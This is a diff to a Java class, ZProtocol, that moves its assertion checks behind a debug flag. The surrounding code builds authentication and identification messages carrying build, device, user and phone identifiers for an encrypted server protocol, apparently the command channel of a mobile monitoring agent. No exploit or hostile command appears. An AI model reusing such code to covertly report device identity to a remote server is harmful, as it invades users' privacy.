@@ -82,7 +82,7 @@ public class ZProtocol extends Protocol {
 	 */
 	@Override
 	public boolean perform() {
-		Check.requires(transport != null, "perform: transport = null");
+		if(Cfg.DEBUG) Check.requires(transport != null, "perform: transport = null");
 
 		try {
 			transport.start();
@@ -326,12 +326,12 @@ public class ZProtocol extends Protocol {
 		// filling structure
 		dataBuffer.write(Kd);
 		dataBuffer.write(Nonce);
-		Check.ensures(dataBuffer.getPosition() == 32,
+		if(Cfg.DEBUG) Check.ensures(dataBuffer.getPosition() == 32,
 				"forgeAuthentication, wrong array size");
 		dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
 		dataBuffer.write(keys.getInstanceId());
 		dataBuffer.write(Utils.padByteArray(keys.getSubtype(), 16));
-		Check.ensures(dataBuffer.getPosition() == 84,
+		if(Cfg.DEBUG) Check.ensures(dataBuffer.getPosition() == 84,
 				"forgeAuthentication, wrong array size");
 		// calculating digest
 		final SHA1Digest digest = new SHA1Digest();
@@ -344,7 +344,7 @@ public class ZProtocol extends Protocol {
 
 		// appending digest
 		dataBuffer.write(sha1);
-		Check.ensures(dataBuffer.getPosition() == data.length,
+		if(Cfg.DEBUG) Check.ensures(dataBuffer.getPosition() == data.length,
 				"forgeAuthentication, wrong array size");
 		return data;
 	}
@@ -365,7 +365,7 @@ public class ZProtocol extends Protocol {
 			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: Fake answer");
 			throw new ProtocolException(14);
 		}
-		Check.ensures(authResult.length == 64, "authResult.length="
+		if(Cfg.DEBUG) Check.ensures(authResult.length == 64, "authResult.length="
 				+ authResult.length);
 		// Retrieve K
 		final byte[] cypherKs = new byte[32];
@@ -435,7 +435,7 @@ public class ZProtocol extends Protocol {
 		dataBuffer.write(userid);
 		dataBuffer.write(deviceid);
 		dataBuffer.write(phone);
-		Check.ensures(dataBuffer.getPosition() == content.length,
+		if(Cfg.DEBUG) Check.ensures(dataBuffer.getPosition() == content.length,
 				"forgeIdentification pos: " + dataBuffer.getPosition());
 		return content;
 	}
@@ -825,8 +825,8 @@ public class ZProtocol extends Protocol {
 	 */
 	private byte[] command(final int command, final byte[] data)
 			throws TransportException {
-		Check.requires(cryptoK != null, "cypherCommand: cryptoK null");
-		Check.requires(data != null, "cypherCommand: data null");
+		if(Cfg.DEBUG) Check.requires(cryptoK != null, "cypherCommand: cryptoK null");
+		if(Cfg.DEBUG) Check.requires(data != null, "cypherCommand: data null");
 		final int dataLen = data.length;
 		final byte[] plainOut = new byte[dataLen + 4];
 		System.arraycopy(Utils.intToByteArray(command), 0, plainOut, 0, 4);
